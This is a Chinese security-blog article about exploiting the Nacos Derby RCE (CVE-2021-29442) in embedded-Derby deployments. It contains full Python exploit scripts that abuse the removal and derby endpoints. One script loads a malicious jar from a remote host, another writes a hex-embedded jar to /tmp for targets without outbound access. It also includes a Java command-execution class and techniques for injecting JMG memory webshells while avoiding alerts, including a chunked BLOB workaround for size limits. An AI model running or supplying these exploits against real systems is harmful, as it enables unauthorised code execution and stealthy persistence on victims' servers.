# 从Nacos derby RCE学习derby数据库的利用-先知社区

> **来源**: https://xz.aliyun.com/news/17763  
> **文章ID**: 17763

---

## 1.概述

漏洞利用条件：

1. 使用derby数据库的嵌入模式。
2. 有token，即需要有权限绕过的漏洞或者有密码
3. 版本：2.x小于2.4.0，1.x<=1.4.7

这篇文章除了常规的漏洞分析外，我做的有价值的工作有两个地方：一是解决了如何联动JMG注入任意内存马，二是解决了不出网情况下写入jar有大小限制的问题。

PS：这个漏洞利用有条件竞争，所以需要发很多次payload才能成功，但使用derby数据库的Nacos很少见，大部分都是MySQL，根据我实战的情况，大概10个Nacos能有一两个是用的derby数据库，利用时如果发现不是derby就不要一直让脚本跑了，跑再久也没用的。

## 2.漏洞原理

Nacos的derby接口和removal接口可以操作derby语句， 而derby数据库允许加载外部类到数据库里并调用里面的方法，从而导致了这个漏洞，从这个漏洞可以学习一下derby数据库的利用。

### 2.1 derby命令执行

derby是一种微型数据库，一般嵌入到Java程序里运行，它有个特性是允许加载外部Java类，具体可以参考官方的文档：

<https://db.apache.org/derby/docs/10.16/devguide/>

如果我们有一个可以执行任意derby语句的地方，那么我们可以通过如下过程来造成命令执行：

```
//编译一个恶意Java类：
import java.io.IOException;

public class test {
    public static void exec() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
//导入这个类到数据库里：
CALL SQLJ.INSTALL_jar('http://127.0.0.1:8080/evil.jar', 'APP.Sample', 0)

//将这个类加入到derby.database.classpath
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','APP.Sample)

//创建一个PROCEDURE，将其指向恶意类里的方法，注意这里只能是静态方法：
CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME 'test.exec'

//调用PROCEDURE即可执行恶意类的方法
CALL SALES.TOTAL_REVENUES()
```

### 2.2 Nacos执行derby语句

Nacos有个历史漏洞CVE-2021-29442，derby接口可以未授权访问导致sql注入：

![image.png](images/img_17763_000.png)

当时Nacos官方的修复措施是增加了Secured修饰符，修复了未授权访问，但这个查询仍然是存在的，只不过变成要鉴权了：

![image.png](images/img_17763_001.png)

所以当有权限绕过或者有密码的时候，这个漏洞仍然是能用的，但只能执行select开头的语句，那怎么才能执行上面所说的一系列语句来造成命令执行呢？这时就要用到另一个接口——removal，removal接口会执行用户上传文件里的每行SQL语句：

于是我们就有了任意执行derby语句的能力

```
  @PostMapping({"/data/removal"})
  @Secured(action = ActionTypes.WRITE, resource = "nacos/admin")
  public DeferredResult<RestResult<String>> importDerby(@RequestParam("file") MultipartFile multipartFile) {
    DeferredResult<RestResult<String>> response = new DeferredResult();
    if (!DatasourceConfiguration.isEmbeddedStorage()) {
      response.setResult(RestResultUtils.failed("Limited to embedded storage mode"));
      return response;
    } 
    DatabaseOperate databaseOperate = (DatabaseOperate)ApplicationUtils.getBean(DatabaseOperate.class);
    WebUtils.onFileUpload(multipartFile, file -> {
          NotifyCenter.publishEvent((Event)new DerbyImportEvent(false));
          databaseOperate.dataImport(file).whenComplete(());
        }response);
    return response;
  }
}
```

### 2.3 漏洞修复

Nacos官方在2.4.0里直接把derby接口默认禁用了，并且随后又限制了derby语句执行范围：

![image.png](images/img_17763_002.png)

禁用后：

![image.png](images/img_17763_003.png)

## 3.漏洞利用

### 3.1简单命令执行

先参考P牛最开始发在vulhub的poc：<https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29442>

通过removal接口传入sql文件，让derby数据库远程加载恶意Java类并创建一个方法指向恶意类的exec，然后再通过derby接口调用方法并传入命令，这里之所有有个for循环，是因为removl接口存在条件竞争，要持续发包很多次直到成功：

```
import random
import sys
import requests
from urllib.parse import urljoin
import argparse


def exploit(target, command, service):  
    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
    for i in range(0, sys.maxsize):
        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
        post_sql = f"""CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
"""
        get_sql = f"select * from (select count(*) as b, S_EXAMPLE_{id}('{command}') as a from config_info) tmp /*ROWS FETCH NEXT*/"
        files = {'file': post_sql}
        post_resp = requests.post(url=removal_url, files=files)
        post_json = post_resp.json()
        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
            print(post_resp.text)
            get_resp = requests.get(url=derby_url, params={'sql': get_sql})
            print(get_resp.text)
            break


def main():
    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-c', '--command', required=True, help='Command to execute')
    parser.add_argument('-s', '--service', required=True, help='Service URL')
    
    args = parser.parse_args()
    
    exploit(args.target, args.command, args.service)

if __name__ == '__main__':
    main()
```

对应的Java类是一个直接传参执行命令的：

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;

public class Exec {
  public static String exec(String cmd) {
    StringBuffer bf = new StringBuffer();
    try {
      String charset = "utf-8";
      String osName = System.getProperty("os.name");
      if (osName != null && osName.startsWith("Windows"))
        charset = "gbk"; 
      Process p = Runtime.getRuntime().exec(cmd);
      InputStream fis = p.getInputStream();
      InputStreamReader isr = new InputStreamReader(fis, charset);
      BufferedReader br = new BufferedReader(isr);
      String line = null;
      while ((line = br.readLine()) != null)
        bf.append(line); 
    } catch (Exception e) {
      StringWriter writer = new StringWriter();
      PrintWriter printer = new PrintWriter(writer);
      e.printStackTrace(printer);
      try {
        writer.close();
        printer.close();
      } catch (IOException iOException) {}
      return "ERROR:" + writer.toString();
    } 
    return bf.toString();
  }
}
```

执行过程：

通过removl接口导入外部jar并指向方法：

![image.png](images/img_17763_004.png)

通过derby接口select调用exec执行命令：

![image.png](images/img_17763_005.png)

### 3.2注入任意内存马

但上面只是简单的命令执行并返回结果，百分百会触发告警，那么如何打内存马呢？

我们已经可以加载恶意jar并执行静态方法了，当加载类时会执行类里的静态代码，我们只需要在内存马注入器的静态代码里将类实例化就能做到注入内存马，而JMG生成的内存马默认就是这样。

网上已经有相应Poc：[https://github.com/Wileysec/nacos\_derby\_rce](https://github.com/Wileysec/nacos_derby_rce，但这个作者只是将P牛的Poc进行了简单改造：)

但这个作者只是将P牛的Poc进行了简单改造：

他是在JMG生成的jar里，加入了一个静态的exec方法然后重新编译，通过这个exec来触发类的实例化从而注入内存马，但这样会导致注入的内存马是写死的：

![image.png](images/img_17763_006.png)

有没有什么办法可以注入任意内存马？如果能联动JMG，将JMG生成的内存马直接注入，那么岂不是又方便又好用？

于是我看了一下JMG生成的注入器，里面存在两个public static的方法，一个是gzipDecompress：

![image.png](images/img_17763_007.png)

一个是invokeMethod：

![image.png](images/img_17763_008.png)

显然前者更适合用来触发实例化，只需要传入byte[]类型的任意数据即可，将P牛的SQL语句进行简单修改：

```
post_sql = f"""CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
CREATE FUNCTION S_EXAMPLE_{id}(PARAM CHAR(32) FOR BIT DATA) RETURNS CHAR(32) FOR BIT DATA PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'ch.qos.logback.w.HTMLUtil.gzipDecompress'
"""
get_sql = f"select * from (select count(*) as b, S_EXAMPLE_{id}(X'1F') as a from config_info) tmp /*ROWS FETCH NEXT*/"
```

Nacos是用的嵌入Tomcat的Spring，我们只需要用JMG生成Tomcat的内存马即可：

![image.png](images/img_17763_009.png)

然后导入jar创建方法指向gzipDecompress方法：

![image.png](images/img_17763_010.png)

调用即可注入JMG生成的内存马，这里会报错是正常的，因为我们传入的本来就不是正常的gzip压缩数据，这里报错说明函数已经执行了，我们的目的已经达到了：

![image.png](images/img_17763_011.png)

![image.png](images/img_17763_012.png)

### 3.3不出网利用

出网利用有个问题就是会有外连，面对高防护单位很可能导致告警，并且机器也可能不出网，所以需要实现不出网的利用。

P牛后来找到一个derby sql写文件的方法：SYSCS\_UTIL.SYSCS\_EXPORT\_QUERY\_LOBS\_TO\_EXTFILE

将jar转hex，然后通过derby的这个方法将hex写成jar文件加载，这样就不需要对方出网：

```
import random
import sys
import requests
from urllib.parse import urljoin
import argparse


def exploit(target, command):  
    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')

    hex_jar = '504b03040a000008000033b9f058000000000000000000000000090000004d4554412d494e462f504b030414000008080033b9f058fcfe28795000000051000000140000004d4554412d494e462f4d414e49464553542e4d46f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5722e4a4d2c494dd175aab452f04d2c4bcd53f0720c5208c8294dcfcc5330d63306a9712acdcc49d1f54ac9d60d2e484d066a34e4e5e2e50200504b03040a0000080000cfaaef5800000000000000000000000004000000636f6d2f504b03040a000008000097b0f0580000000000000000000000000c000000636f6d2f747267616e64612f504b03040a000008000033b9f0580000000000000000000000000f0000004d4554412d494e462f6d6176656e2f504b03040a000008000033b9f0580000000000000000000000001b0000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f504b03040a000008000033b9f058000000000000000000000000230000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f504b030414000008080033b9f0589475fc2c7b040000720800000a000000457865632e636c6173738d555b535b5514fe4e48b20f87700b0448e90d6bdb700958b55a435b2d6d6ab1e162a060506b4f4e4ee04048e2c909975ab53ae38ce33ff0c5195fe4b5be848eccf8d8077f8ccf3e15bf7d02210c716c26b3f75e6b7dfb5b6bafb5d7d97fbdfce34f006fe37b0daf6352e0230d1e4caab8af22a1610ad32a6634dcc1ac8a8f3524312787790d713c1058d0d08a45814f34b423258725b9fd5381cf043ed7d02d191f6ae8c1171abaf0486a7429ea02690143c369e92b2367531ab37295951c598165811505feeb56de726e2a688a0c2e28f0de2e644c05ed092b6f4e97d7d3a63dafa773d404130543cf2de8b625e503a5d759b14ae448c4b74c639cb2c959c1a5486255dfd0c7727a7e796cceb1adfcf2f8e049950261ace876c974247d03b3bf509ad6d7e947292ae8aa43ccda05c32c950869caca0042559b55189bcc17cb0e094c7d5d5aad92ada0bf913569ea19d326c69326a4af06992867b3a66d666a766f8ea9602c9bb6e59884f6d4a0d538175dbd3c4c91a20b390a6756aa6a08c5acd9dc63c4b70cb3e85885bc0cd558cfc860b2b560ea72510d8aa8d6394737d6a6f4a25b00014b6055604d81365728db8679d792656996e5189524015cc425c6dc985081afec64a3d7187ba1349a67aa057201ac234acda295cf14364b01e4516078cbe9358162005fc20e6004d43b282b08ff676aa5eb8d43d727122bad9b016c613b80c7f88ae56d901605dd8d727d083e9e5fc9f82480aff14d00dfca43d7409333758cbd275361e53292d41f4f2667923119cfd300bec3366b1f77ef73c7d19e99f4aa6938c754551a059d27ee677d0c47e939be79bbe49854b52c9b0e77154ddba15fade4e8b6535ab41c7668a851372d1df3972ce71d4b368a469a9a108ad437dd819a97e8f2ffb4e75177b591ee58e4bd8794275a6d28d2d0d0c013bf325d47e0833e935a953b3209b7dbba230dbf177ebd5834f3ec939157fac2d4daa6cedf41334a7fed6ec3ba1d356feb06ddf6451a76ae04fb8c5ca14448f4153dbb978aae55a75055610017f806c89f078aec4b8e97298d715638fb8676a1fcee9a231cfdae52c520c7401580210c736e66ff45ab9b3d7e782903bfedc193da455322e89d0afa9ec33f1d7d81f6685054a0fe0c7fb079ea39b4a10a5a62deb0b78240ccb787d654d837b28bb6987f0feda9b07f171d31a1c4d4303775a662ea0bb40e87d50a828b3bfb7fefe0d6d41ebae92334bd879e547417bd31ef8824eb8b5610968b533bf049e2d3449d099eade01c2de7395530f06cb882d79ef16c2a1ec1e06bf5043fe047f4a3c93ded125f2da085d6568e6de8e46377161d4c5a90a7eec215be5e3710c23de2eea3170be823cf45329d42862c393e6c1b3843d673788af3e41ec04f4cf7af4cb3cce063e6b0050f30ca747bc83e8337b86a22f73be47e9359bc42f92dbed43efab980abd4fbe9ad0fefe21a047d86f01e112a3d5d450ce3dcbbc16a5c27dacb086ee026de27332b810f889395fb05b730c13adda6f410e22506043c0277f8df6750cdeef240211017b82bd02ad04e11d8e781ab36924e0874edf334bec32d5d02dd82a95004fa957fe4021fba37e7debf504b030414000008080058aaef5840b75f2d53010000eb0200002a0000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e786d6c8d91cd6ec2301084ef3c45947bec507a40c8b5d443ab56828204ad7a35f636982676643b84be7d6d879fe440d55b76f6db9df186d446ef81bbe45895ca3ea43be7ea19c6153b8042ac667c07489b02af960b7c8f7294a71d393b5a79a1dbb645ed247277793ec69f8bf9da0f562c93ca3aa638a4a324f113331be5b9e6cc49adfe6197dc228e5674621639e4eb947a17526901e50718eb0d68ec113cd046812a8c6eea5741b9ae9033055382117c1603c08c935f8c3b5f1a28c05b12dcd30272382d1ca33c5bbf3daed62fcb0dc16735103eee372ba42ae89e1982af65cca05805d7e5b10a72634a7ae3d50487661cf6ffad069f076c18ea84f023d1b691a540563786c393e25a04bff7cd7336f501fe62c256dc5f1b04013528018a5f8d2ed24f27f4aeb96f9474833bc676ef6e276278c9089def364153341e9c31b62df7c1a803eba7bbef2e0d1ec6e9d531f1e5cd74f40b504b0304140000080800ca82f0586a0b6b6f3c0000003c000000310000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e70726f706572746965734b2c2ac94c4b4c2ef14cb12d4a4d4fcd2f4ae74a2fca2f2d00f293f373f54a8ad213f35212b9ca528b8a33f3f36c0df50c7483fd1c03823dfc43b800504b010214030a000008000033b9f058000000000000000000000000090000000000000000001000ed41000000004d4554412d494e462f504b0102140314000008080033b9f058fcfe28795000000051000000140000000000000000000000a481270000004d4554412d494e462f4d414e49464553542e4d46504b010214030a0000080000cfaaef58000000000000000000000000040000000000000000001000ed41a9000000636f6d2f504b010214030a000008000097b0f0580000000000000000000000000c0000000000000000001000ed41cb000000636f6d2f747267616e64612f504b010214030a000008000033b9f0580000000000000000000000000f0000000000000000001000ed41f50000004d4554412d494e462f6d6176656e2f504b010214030a000008000033b9f0580000000000000000000000001b0000000000000000001000ed41220100004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f504b010214030a000008000033b9f058000000000000000000000000230000000000000000001000ed415b0100004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f504b0102140314000008080033b9f0589475fc2c7b040000720800000a0000000000000000000000a4819c010000457865632e636c617373504b0102140314000008080058aaef5840b75f2d53010000eb0200002a0000000000000000000000a4813f0600004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e786d6c504b01021403140000080800ca82f0586a0b6b6f3c0000003c000000310000000000000000000000a481da0700004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e70726f70657274696573504b0506000000000a000a00ab020000650800000000'

    headers = {
        "User-Agent": "Nacos-Server"
    }

    for i in range(0, sys.maxsize):
        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
        post_sql = f"""
CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''{hex_jar}'' as blob)', '/tmp/{id}', ',', '"', 'UTF-8', '/tmp/{id}.jar')
CALL sqlj.install_jar('/tmp/{id}.jar', 'NACOS.{id}', 0)
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
"""
        get_sql = f"SELECT * FROM (SELECT COUNT(*) AS b, S_EXAMPLE_{id}('{command}') AS a FROM config_info) tmp"
        files = {'file': post_sql}
        post_resp = requests.post(url=removal_url, files=files, headers=headers)
        post_json = post_resp.json()
        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
            print(post_resp.text)
            get_resp = requests.get(url=derby_url, params={'sql': get_sql})
            print(get_resp.text)
            break


def main():
    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-c', '--command', required=True, help='Command to execute')
    
    args = parser.parse_args()
    
    exploit(args.target, args.command)

if __name__ == '__main__':
    main()
```

但我在测试时遇到一个问题就是，通过这种方式写入的文件有大小限制：

![image.png](images/img_17763_013.png)

我查了下derby的官方文档，发现这里的大小限制是16336个字节：

![image.png](images/img_17763_014.png)

由于文件转16进制会导致大小翻倍，也就是说我们最大只能注入jar不超过8KB大小的内存马，我用JMG试了一下，发现只有冰蝎和蚁剑的内存马比较小不到8K，哥斯拉有10K、Suo5有15K，那么就需要绕过这个限制。

于是我先创建一个表，分两次把jar的16进制写进表里，然后再导出到文件：

```
CREATE TABLE FILE_STORAGE (
    id INTEGER PRIMARY KEY,
    file_data BLOB,
    file_name VARCHAR(255)
);

-- 第一片
INSERT INTO FILE_STORAGE (id, file_data, file_name) 
VALUES (1, CAST(X'第一块十六进制数据' AS BLOB), 'example.jar');

-- 第二片
INSERT INTO FILE_STORAGE (id, file_data, file_name) 
VALUES (2, CAST(X'第二块十六进制数据' AS BLOB), 'example.jar');

-- 导出时，使用ORDER BY确保按正确顺序拼接
CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(
    'SELECT file_data FROM FILE_STORAGE WHERE file_name = ''example.jar'' ORDER BY id',
    '/tmp/query.del',
    null,
    null,
    'UTF-8',
    '/tmp/example.jar'
);
```

导入jar并指向方法成功：

![image.png](images/img_17763_015.png)

![image.png](images/img_17763_016.png)

注入内存马成功：

![image.png](images/img_17763_017.png)
